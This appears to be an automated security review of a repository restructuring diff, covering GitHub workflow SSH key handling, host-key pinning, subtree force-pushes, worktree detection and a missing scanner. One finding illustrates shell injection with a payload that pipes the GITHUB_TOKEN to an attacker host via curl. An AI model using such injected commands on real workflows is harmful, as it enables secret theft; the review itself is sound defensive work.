# Gate 0 Tier 2 — Security Review

**Reviewer:** Security Reviewer (LLM Semantic)
**Diff scope:** Package restructuring — factory scripts and skills moved from `scripts/` and `.claude/skills/` into `packages/dark-factory/` and `packages/pr-review-pack/`
**Tier 1 context:** Bandit was SKIPPED (not installed). No Tier 1 security findings to build on.

---

## Findings

### FINDING: publish-subtrees.yml writes SSH deploy key to disk without restrictive umask
SEVERITY: WARNING
FILE: .github/workflows/publish-subtrees.yml
LINE: 47-51, 86-90
EVIDENCE:
```yaml
- name: Configure SSH deploy key
  run: |
    mkdir -p ~/.ssh
    ssh-keyscan github.com >> ~/.ssh/known_hosts 2>/dev/null
    echo "${{ secrets.PR_REVIEW_PACK_DEPLOY_KEY }}" > ~/.ssh/deploy_key
    chmod 600 ~/.ssh/deploy_key
```
IMPACT: The `mkdir -p ~/.ssh` does not set restrictive permissions on `~/.ssh/` itself. SSH best practice requires `chmod 700 ~/.ssh`. On a shared runner (if runner reuse were ever enabled or if another step in the same job runs untrusted code), the directory could be readable. The key itself is `chmod 600` which is correct, but the parent directory should be `700`. In the current GitHub-hosted runner context, this is low risk because each job gets a fresh VM, but it would be exploitable if migrated to self-hosted runners.
FIX: Add `chmod 700 ~/.ssh` after `mkdir -p ~/.ssh`. This is defense-in-depth.

---

### FINDING: publish-subtrees.yml redirects ssh-keyscan stderr to /dev/null, hiding MITM indicators
SEVERITY: WARNING
FILE: .github/workflows/publish-subtrees.yml
LINE: 49, 88
EVIDENCE:
```yaml
ssh-keyscan github.com >> ~/.ssh/known_hosts 2>/dev/null
```
IMPACT: `ssh-keyscan` is used to trust-on-first-use (TOFU) the GitHub SSH host key at workflow runtime. This is inherently a MITM-susceptible pattern — if the runner's DNS is poisoned or network is intercepted, a malicious host key would be silently accepted. Suppressing stderr (`2>/dev/null`) hides warnings that ssh-keyscan emits when something looks unusual. A better pattern is to pin the known GitHub SSH host key fingerprints as a static string instead of fetching them dynamically at runtime.
FIX: Replace `ssh-keyscan` with a hardcoded known_hosts entry. GitHub publishes their SSH host keys at https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/githubs-ssh-key-fingerprints. Pin these statically:
```yaml
echo "github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl" >> ~/.ssh/known_hosts
```

---

### FINDING: publish-subtrees.yml uses --force-with-lease to push to standalone repos
SEVERITY: NIT
FILE: .github/workflows/publish-subtrees.yml
LINE: 58, 97
EVIDENCE:
```yaml
git push pr-review-pack subtree-pr-review-pack:main --force-with-lease
git push dark-factory subtree-dark-factory:main --force-with-lease
```
IMPACT: `--force-with-lease` is a good mitigation compared to `--force`, but it still force-pushes to the `main` branch of standalone repos on every subtree publish. If an attacker could compromise the monorepo's main branch (or a PR merged to main with malicious changes in `packages/**`), the malicious code would be auto-published to both standalone repos. The blast radius of a monorepo compromise extends to both downstream repos automatically. This is an inherent design trade-off of subtree publishing, not a bug per se, but it should be documented.
FIX: This is an accepted risk given the architecture. Consider adding a manual approval gate or tag-based publishing if the standalone repos gain external consumers.

---

### FINDING: _get_repo_root() sentinel uses .git directory presence — does not handle .git files (worktrees)
SEVERITY: WARNING
FILE: packages/dark-factory/scripts/check_test_quality.py (and 7 other scripts)
LINE: varies (the _get_repo_root function in each script)
EVIDENCE:
```python
def _get_repo_root() -> Path:
    """Walk up from this file to find the git repo root."""
    current = Path(__file__).resolve().parent
    for parent in [current, *current.parents]:
        if (parent / ".git").is_dir():
            return parent
    raise RuntimeError("Repo root not found -- no .git directory in any parent")
```
The check is `(parent / ".git").is_dir()`. In a git worktree, `.git` is a **file** (not a directory) — it contains a `gitdir:` pointer to the main worktree's `.git/worktrees/` subdirectory.
IMPACT: All 8 factory scripts will raise `RuntimeError("Repo root not found")` when executed from within a git worktree. This is a functional correctness issue with security implications: if the script fails to find the repo root and someone adds a fallback that's less strict, it could lead to path traversal. Currently the hard RuntimeError is the safe outcome — scripts just won't work in worktrees. Given that the factory itself runs in worktrees (`.claude/worktrees/`), this is a real operational concern.
FIX: Change the check to `(parent / ".git").exists()` instead of `.is_dir()`. This handles both regular repos (`.git` is a dir) and worktrees (`.git` is a file). All 8 scripts need this fix:
- `check_test_quality.py`
- `compile_feedback.py`
- `nfr_checks.py`
- `persist_decisions.py`
- `restore_holdout.py`
- `run_gate0.py`
- `run_scenarios.py`
- `strip_holdout.py`

---

### FINDING: Symlinks in .claude/skills/ point outside the .claude directory
SEVERITY: NIT
FILE: .claude/skills/factory-orchestrate, .claude/skills/pr-review-pack
LINE: (new symlinks)
EVIDENCE:
```
+../../packages/dark-factory
+../../packages/pr-review-pack
```
These are relative symlinks from `.claude/skills/` to `../../packages/`. Symlinks pointing to `../..` relative to `.claude/skills/` resolve correctly to the repo root's `packages/` directory.
IMPACT: These symlinks are benign — they point to sibling directories within the same repository. There is no symlink escape risk because both source and target are within the repo root. However, symlinks are resolved differently by `git subtree split`. The `publish-subtrees.yml` workflow explicitly resolves these symlinks before splitting (replacing symlinks with copies of the real directory), which is the correct approach. If the workflow step were ever removed, the standalone repos would contain dangling symlinks.
FIX: No action needed. The architecture is sound. The symlink resolution in publish-subtrees.yml is the correct mitigation.

---

### FINDING: package/dark-factory/review-prompts and packages/pr-review-pack/review-prompts symlinks create shared mutable access
SEVERITY: NIT
FILE: packages/dark-factory/review-prompts, packages/pr-review-pack/review-prompts
LINE: (new symlinks)
EVIDENCE:
```
+../review-prompts
```
Both `packages/dark-factory/review-prompts` and `packages/pr-review-pack/review-prompts` are symlinks to `packages/review-prompts/`. This creates an aliasing situation where the same review prompt files are accessible through three different paths.
IMPACT: This is a design choice, not a vulnerability. The risk is that a modification through one path could have unexpected effects through another. In a security context, if a compromised process gained write access to `packages/review-prompts/`, it would simultaneously affect both the dark-factory and pr-review-pack Gate 0 review paradigm prompts. However, since all three paths are within factory-protected files that Codex never touches, the practical risk is minimal.
FIX: No action needed. The shared-prompts-via-symlink pattern is appropriate here.

---

### FINDING: strip_holdout.py uses glob patterns for review pack artifact removal — potential for over-matching
SEVERITY: NIT
FILE: packages/dark-factory/scripts/strip_holdout.py
LINE: 43-46 (new code)
EVIDENCE:
```python
REVIEW_PACK_PATTERNS = [
    "docs/pr*_review_pack.html",
    "docs/pr*_diff_data.json",
    "docs/pr*_review_pack.approval.json",
]
```
Previously, the patterns were exact file paths (`docs/pr_review_pack.html`, `docs/pr_diff_data.json`). Now they use glob patterns with `pr*` prefix.
IMPACT: The glob `pr*` would match any file starting with `pr` in the `docs/` directory that ends with the specified suffix. In practice, the naming convention is `pr{N}_review_pack.html` (N is a PR number), so the risk of accidentally deleting unrelated files is extremely low. A malicious attractor could not exploit this because (a) the strip script is factory-protected and (b) the attractor doesn't control the `docs/` directory naming. The previous exact-match approach would have missed review packs for PRs other than the first, so this change is functionally correct.
FIX: No action needed. The glob patterns are appropriately scoped.

---

### FINDING: Tier 1 security scanning completely absent (bandit not installed)
SEVERITY: WARNING
FILE: artifacts/factory/gate0_results.json
LINE: 6-22
EVIDENCE:
```json
"security": {
    "name": "security",
    "status": "skipped",
    "findings": [{
        "message": "bandit not available — install with: pip install bandit"
    }]
}
```
IMPACT: The entire Tier 1 security scanning layer is non-functional. This means this Tier 2 review is operating without any automated security baseline. Common Python security patterns (subprocess with shell=True, assert in production code, hardcoded passwords, unsafe deserialization) that bandit would catch automatically are only being caught if this human-like review notices them. For a restructuring crank this is lower risk (no new product code), but the gap should be addressed.
FIX: Add `bandit` to `requirements-dev.txt` (or the equivalent dev dependency file) and ensure it is installed in the CI and factory environments.

---

### FINDING: factory.yaml workflow uses unsanitized workflow_dispatch inputs in shell commands
SEVERITY: WARNING
FILE: packages/dark-factory/workflows/factory.yaml
LINE: 2224-2226
EVIDENCE:
```yaml
MAX_ITER=${{ inputs.max_iterations || '5' }}
THRESHOLD=${{ inputs.satisfaction_threshold || '0.80' }}
CURRENT_ITER=$(cat artifacts/factory/iteration_count.txt)
```
The `inputs.max_iterations` and `inputs.satisfaction_threshold` are user-provided workflow_dispatch inputs that are directly interpolated into a shell script via `${{ }}` expansion. If an attacker with workflow_dispatch permission provided a malicious value like `5; curl attacker.com/exfil -d $(cat $GITHUB_TOKEN)` for `max_iterations`, it would execute as shell injection.
IMPACT: The blast radius is limited by the `permissions` block (`contents: write, pull-requests: write, issues: write`) and by the fact that only repo collaborators can trigger workflow_dispatch. However, any collaborator with write access could inject arbitrary commands that run with the workflow's GITHUB_TOKEN. This is a known GitHub Actions anti-pattern (CWE-78).
FIX: Use environment variables instead of direct interpolation:
```yaml
env:
  MAX_ITER: ${{ inputs.max_iterations || '5' }}
  THRESHOLD: ${{ inputs.satisfaction_threshold || '0.80' }}
```
Then reference as `$MAX_ITER` and `$THRESHOLD` in the shell script (NOT `${{ }}` interpolation). Environment variables are not subject to shell metacharacter injection.

---

### FINDING: datetime.now() without UTC in run_gate0.py
SEVERITY: NIT
FILE: packages/dark-factory/scripts/run_gate0.py
LINE: ~232 (new code)
EVIDENCE:
```python
-from datetime import UTC, datetime
+from datetime import datetime
...
-        "timestamp": datetime.now(UTC).isoformat(),
+        "timestamp": datetime.now().astimezone().isoformat(),
```
The change replaces `datetime.now(UTC)` with `datetime.now().astimezone()`. This produces a timezone-aware timestamp in the local timezone instead of UTC.
IMPACT: Not a security vulnerability per se, but timestamp inconsistency across environments (CI runs in UTC, local dev runs in local time) can confuse log correlation and make forensic analysis harder. If factory artifacts from different runs need to be compared chronologically, local-timezone timestamps introduce ambiguity.
FIX: Revert to `datetime.now(UTC).isoformat()` or use `datetime.now(timezone.utc).isoformat()` if the `UTC` constant is not available in the target Python version.

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 0 |
| WARNING | 5 |
| NIT | 4 |

**Overall Assessment:** No security-critical findings. This is a restructuring crank that moves files without introducing new attack surfaces. The most operationally impactful finding is the `_get_repo_root()` function using `.is_dir()` instead of `.exists()`, which will break all 8 factory scripts when run from git worktrees. The `publish-subtrees.yml` workflow's SSH key handling follows reasonable patterns but could be hardened with pinned host keys. The `factory.yaml` workflow has a pre-existing shell injection risk via `${{ inputs }}` interpolation that should be addressed. Bandit not being installed means Tier 1 security coverage is zero — this should be fixed.

**Verdict:** PASS (no CRITICAL findings). All WARNING-level findings should be addressed but are non-blocking for this restructuring crank.
